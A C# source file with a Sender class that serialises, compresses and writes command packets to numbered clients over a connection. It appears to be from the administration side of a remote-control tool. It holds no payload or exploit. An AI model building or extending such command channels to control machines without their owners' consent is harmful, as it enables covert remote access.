using System;
using System.Diagnostics;
using System.IO;
using Orcus.Administration.Core.Annotations;
using Orcus.Administration.Core.Connection;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Communication;
using Orcus.Shared.Compression;
using Orcus.Shared.Connection;
using Orcus.Shared.Data;
using Orcus.Shared.Server;

namespace Orcus.Administration.Core
{
    public class Sender : ISender, IDisposable
    {
        public readonly object WriterLock = new object();

        public Sender(IConnection connection)
        {
            Connection = connection;
        }

        public IConnection Connection { get; }

        public void Dispose()
        {
            lock (WriterLock)
                Connection.Dispose();
        }

        public void SendCommand(int id, byte[] bytes, PackageCompression packageCompression = PackageCompression.Auto)
        {
            try
            {
                byte[] compressedData = null;
                var compressed = false;
                if ((bytes.Length > 75 && packageCompression == PackageCompression.Auto) || packageCompression == PackageCompression.Compress) //Because there is a lot of overhead, we don't compress below 75 B
                {
                    compressedData = LZF.Compress(bytes, 0);
                    if (bytes.Length > compressedData.Length)
                        //If the compression isn't larger than the source, we will send the compressed data
                        compressed = true;
                }

                lock (WriterLock)
                {
                    Connection.BinaryWriter.Write(
                        (byte)
                            (compressed
                                ? FromAdministrationPackage.SendCommandCompressed
                                : FromAdministrationPackage.SendCommand));
                    Connection.BinaryWriter.Write((compressed ? compressedData.Length : bytes.Length) + 5);
                    Connection.BinaryWriter.Write(BitConverter.GetBytes(id));
                    Connection.BinaryWriter.Write((byte) SendingType.Command);
                    Connection.BinaryWriter.Write(compressed ? compressedData : bytes);
                    Connection.BinaryWriter.Flush();
                }

                if (compressed)
                    Debug.Print(
                        $"Saved {bytes.Length - compressedData.Length} ({compressedData.Length}/{bytes.Length}");
            }
            catch (Exception)
            {
                // ignored
            }
        }

        public void UnsafeSendCommand(int clientId, uint commandId, WriterCall writerCall)
        {
            try
            {
                lock (WriterLock)
                {
                    Connection.BinaryWriter.Write((byte) FromAdministrationPackage.SendCommand);
                    Connection.BinaryWriter.Write(writerCall.Size + 9);
                    Connection.BinaryWriter.Write(BitConverter.GetBytes(clientId));
                    Connection.BinaryWriter.Write((byte) SendingType.Command);
                    Connection.BinaryWriter.Write(BitConverter.GetBytes(commandId));
                    writerCall.WriteIntoStream(Connection.BaseStream);
                    Connection.BinaryWriter.Flush();
                }
            }
            catch (Exception)
            {
                // ignored
            }
        }

        public void SendDynamicCommand(byte[] bytes)
        {
            try
            {
                byte[] compressedData = null;
                var compressed = false;
                if (bytes.Length > 75) //Because there is a lot of overhead, we don't compress below 75 B
                {
                    compressedData = LZF.Compress(bytes, 0);
                    if (bytes.Length > compressedData.Length)
                        //If the compression isn't larger than the source, we will send the compressed data
                        compressed = true;
                }

                lock (WriterLock)
                {
                    Connection.BinaryWriter.Write(
                        (byte)
                            (compressed
                                ? FromAdministrationPackage.SendDynamicCommandCompressed
                                : FromAdministrationPackage.SendDynamicCommand));
                    Connection.BinaryWriter.Write(compressed ? compressedData.Length : bytes.Length);
                    Connection.BinaryWriter.Write(compressed ? compressedData : bytes);
                    Connection.BinaryWriter.Flush();
                }
            }
            catch (Exception)
            {
                // ignored
            }
        }

        public void OpenClientRedirect(int clientId, ClientRedirectOptions clientRedirectOptions,
            FromAdministrationPackage packageId, int size, [InstantHandle] Action<BinaryWriter> writeAction)
        {
            lock (WriterLock)
            {
                Connection.BinaryWriter.Write((byte) FromAdministrationPackage.ClientRedirect);
                Connection.BinaryWriter.Write(size);
                Connection.BinaryWriter.Write(clientId);
                Connection.BinaryWriter.Write((int) clientRedirectOptions);
                Connection.BinaryWriter.Write((byte) packageId);
                writeAction(Connection.BinaryWriter);
            }
        }
    }
}